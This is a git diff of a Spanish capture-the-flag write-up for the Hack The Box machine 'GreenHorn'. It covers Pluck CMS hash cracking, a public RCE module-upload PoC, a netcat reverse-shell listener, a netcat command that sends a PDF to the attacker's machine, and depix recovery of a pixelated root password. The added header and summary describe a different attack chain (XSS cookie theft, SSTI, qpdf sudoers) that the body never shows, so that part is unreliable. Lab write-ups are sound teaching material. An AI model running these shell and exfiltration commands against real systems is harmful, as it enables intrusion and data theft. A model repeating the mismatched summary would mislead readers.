@@ -1,3 +1,28 @@
+---
+layout: single
+title: "GreenHorn - Hack The Box"
+excerpt: ""
+date: 2024-06-05
+classes: wide
+header:
+  teaser: /assets/images/htb-writeup-greenhorn/greenhorn_logo.png
+  teaser_home_page: true
+  icon: /assets/images/hackthebox.webp
+categories:
+  - hackthebox
+tags:
+  - XSS
+  - XSS session hijacking
+  - SSTI
+  - db creds
+  - hash cracking
+  - abusing sudoers > qpdf
+---
+
+![](/assets/images/htb-writeup-greenhorn/greenhorn_logo.png)
+
+Para resolver esta máquina, interceptamos la solicitud de inicio de sesión, logrando llevar a cabo un XSS para robar una cookie de sesión válida. Con esta cookie, ingresamos al dashboard, que contiene un sistema de facturación que genera un código QR y un enlace. Al utilizar el enlace, se crea un escaneable, cuya solicitud interceptamos para poder inyectar SSTI. Posteriormente, logramos establecer una Reverse Shell. En el código fuente de la web, descubrimos en texto claro el usuario y la contraseña de la base de datos, encontrando así las credenciales de un usuario válido que desencriptamos. Finalmente, abusamos de los permisos SUDOERS del binario 'qpdf' para convertirnos en ROOT.
+
 
 # PortScan
 ```java
@@ -92,36 +117,38 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 # Web Site
-![[Pasted image 20240726102600.png]]
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726102600.png)
 
 De primera se me ocurre que es un **CMS**, pensé de primeras "WordPress?, Joomla?", es los típicos vaya... pero para confirmarlo analice las tecnologías de la pagina con **whatweb**.
-![[Pasted image 20240726102802.png]]
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726102802.png)
 
 descubro que es un "**Pluck**", nunca había oído de este CMS, pero hice una investigación rápida en internet, incluso de esa versión, descubriendo un **PoC** existente para un **RCE** logueado como admin [CVE-2023-50564](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC), doy a "**admin**" en el Footer de la pagina principal y me redirige al logueo con ruta: **/login.php**, intente credenciales típicas, y no logre nada, de hecho después de varios intento me bloqueaba por 5 minutos, por lo que descartaría un **Brute Force Attack**.
 
-![[Pasted image 20240726103611.png]]
-
-
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726103611.png)
 
 Como **nmap** reporto al principio por el banner del **:3000** era un **HTTP**, así que me dirijo allí a ver que es ya que **nmap** no relevo información interesante.
-![[Pasted image 20240726103958.png]]
+
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726103958.png)
 
 Descubro un **Gitea**, que de primera no se que es, googleo & es un control de versiones así como **Github**, así que se me ocurre seguir indagando a ver si encuentro el código fuente del proyecto, asi que clickeo en "**Explore**".
 
-![[Pasted image 20240726104135.png]]Descubriendo lo que parece ser el código fuente de la aplicación, así que empiezo a indagar & buscar credenciales o vulnerabilidades que lleven a un **RCE**.
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726104135.png)
 
-![[Pasted image 20240726104350.png]]
+Descubriendo lo que parece ser el código fuente de la aplicación, así que empiezo a indagar & buscar credenciales o vulnerabilidades que lleven a un **RCE**.
+
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726104350.png)
 
 Descubriendo en el "**Login.php**", que utiliza un script en "**/data/settings/pass.php**" para verificar que esa es la contraseña de admin, y la contraseña que se ponga como input se convierte en un hash **sha512** para corroborar que esa es la contraseña correcta, asi que voy a ver la contraseña de admin en **data**...
 
-![[Pasted image 20240726104837.png]]
+![](Pasted image 20240726104837.png)
 
 definitivamente es un hash, así que se me ocurre usar **John The Ripper** para probarlo con el diccionario de **Rockyou.txt** a ver si el hash coincide con alguna contraseña de ese diccionario...
 
-![[Pasted image 20240726105308.png]]
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726105308.png)
 
 Logrando así encontrar la contraseña correcta para entrar como **admin** al CMS.
-![[Pasted image 20240726105511.png]]
+
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726105511.png)
 
 y ya en este punto podría aprovecharme del **PoC** que encontré al principio para un **RCE** & entablarnos una **Reverse Shell.**
 
@@ -146,7 +173,7 @@ nc -nlvp PORT
 5. Subimos el **.zip** en  la ruta **/admin.php?action=installmodule**:
 
 y así recibiríamos la Shell:
-![[Pasted image 20240726110108.png]]
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726110108.png)
 
 ya quedaría darle Tratamiento a la TTY, sino sabes [((HAZ CLICK AQUI))](https://4uli.github.io/tratamiento-tty/#)
 
@@ -156,7 +183,7 @@ ____
 # Privilege Escalation 1
 
 Primero miro los usuarios con directorios en **/home**, descubriendo que existen dos.
-![[Pasted image 20240726110350.png]]
+![](Pasted image 20240726110350.png)
 
 primero intento reutilizar la contraseña del panel del **CMS** con **GIT**, no logro nada, pero con **Junior** si reutilizar la contraseña, Y VUALA.
 
@@ -164,7 +191,7 @@ _____
 
 # Privilege Escalation 2
 
-![[Pasted image 20240726110522.png]]
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726110522.png)
 
 En el directorio personal de Junior hay un PDF de utilizando **OpenVAS**, que es un componente de escaneo automático, que para cierto escaneos necesita de permisos ROOT así que me interesa ver que tiene este **PDF**, procedo a mandarmelo a mi maquina atancate.
 
@@ -181,7 +208,7 @@ nc IP PORT < 'Using OpenVAS.pdf'
 
 Miramos el **.pdf** con el navegador que mejor nos siente...
 
-![[Pasted image 20240726111532.png]]
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726111532.png)
 
 solo **ROOT** puede ejecutar **OpenVAS**, y esta la credenciales en el **pdf**, pero esta **"censurado"**, pero podemos usar herramienta para intentar descifrar la contraseña....
 
@@ -200,10 +227,10 @@ python3 depix.py \
 
 
 una vez finalice, nos dará un **output.png** el cual sera una "Reconstrucción" de la **"posible"** contraseña.
-![[Pasted image 20240726112549.png]]
+![](Pasted image 20240726112549.png)
 
 intento escalar a **Root** con estas credenciales y...
 
-![[Pasted image 20240726112746.png]]
+![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726112746.png)
 
 MAGIAAAAAAAAAAA
